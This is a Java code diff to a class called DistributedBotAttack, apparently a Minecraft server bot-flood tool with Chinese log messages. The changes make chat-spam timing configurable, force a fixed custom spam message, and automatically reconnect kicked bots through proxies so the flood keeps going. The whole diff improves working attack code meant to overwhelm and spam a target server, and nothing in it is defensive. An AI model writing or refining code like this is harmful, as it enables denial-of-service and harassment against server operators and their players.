@@ -64,8 +64,10 @@ public class DistributedBotAttack extends IAttack {
 	boolean autoauth;
 	boolean spam;
 	boolean debug;
+	int spamdelay;
 
 	public void start(final String ip, final int port) {
+		spamdelay = config.toint(config.getValue("spamdelay"));
 		debug = config.getBoolean("debug");
 		Utils.log("请输入名称前缀：如CNMD 末尾自动添加后缀");
 		name = config.getValue("name");
@@ -118,17 +120,13 @@ public class DistributedBotAttack extends IAttack {
 							clients.forEach(c -> {
 								if (c.getSession().isConnected()) {
 									if (c.getSession().hasFlag("join")) {
-										if (custspam) {
-											spammer(c.getSession(), spammessage);
-										} else {
-											spammer(c.getSession(), Utils.getclnmsl());
-										}
+										spammer(c.getSession(), spammessage);
 
 									}
 								}
 							});
 						}
-						Thread.sleep(1000);
+						Thread.sleep(spamdelay);
 					} catch (Exception e) {
 					}
 
@@ -305,7 +303,14 @@ public class DistributedBotAttack extends IAttack {
 				String reason = e.getReason();
 				boolean status = reason.contains("重");
 				if (status) {
-					createClient(ip, port, username, proxy);
+					Client client = createClient(ip, port, username, proxy);
+					client.getSession().setReadTimeout(10 * 1000);
+					client.getSession().setWriteTimeout(10 * 1000);
+					synchronized (clients) {
+						clients.add(client);
+					}
+					Utils.log("[" + username + "]正在重连......");
+
 				}
 
 			}
@@ -346,8 +351,7 @@ public class DistributedBotAttack extends IAttack {
 		try {
 			session.send((Packet) new ClientSwingArmPacket());
 			session.send((Packet) new ClientChangeHeldItemPacket(1 + new Random().nextInt(8)));
-			session.send((new ClientPlayerRotationPacket(false, 110, 30)));
-			session.send((new ClientKeepAlivePacket(10)));
+			session.send((new ClientKeepAlivePacket(1)));
 		} catch (Exception e) {
 		}
 	}
